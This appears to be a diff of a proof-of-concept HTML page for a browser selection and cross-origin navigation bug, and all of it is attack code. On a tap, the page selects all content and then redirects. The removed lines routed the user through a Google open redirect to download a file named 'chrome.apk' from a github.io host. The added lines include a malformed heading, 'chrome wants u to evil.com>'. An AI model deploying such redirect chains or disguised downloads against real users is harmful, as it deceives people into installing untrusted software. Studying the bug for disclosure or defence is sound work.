@@ -3,31 +3,22 @@
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Origin A</title>
-
 <script>
 function trigger() {
-  // 1. Create selection on Origin A
+  // Step 1: create selection
   document.execCommand("selectAll");
 
-  // 2. First navigation: Google redirect URL
+  // Small delay to ensure selection state is committed
   setTimeout(() => {
-    location.href =
-      "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
+    // Step 2: cross-origin navigation
+    location.href = "https://chrome.com/";
   }, 50);
 }
-
-// 3. After landing on google.com, redirect again to chrome.com
-window.addEventListener("load", () => {
-  if (location.hostname === "www.chrome.com") {
-    setTimeout(() => {
-      location.href = "https://chrome.com";
-    }, 1);
-  }
-});
 </script>
 </head>
-
 <body onmousedown="trigger()">
-  <h2>Tap anywhere</h2>
+<h2>chrome wants u to evil.com>
+
+<p>Tap anywhere</p>
 </body>
 </html>
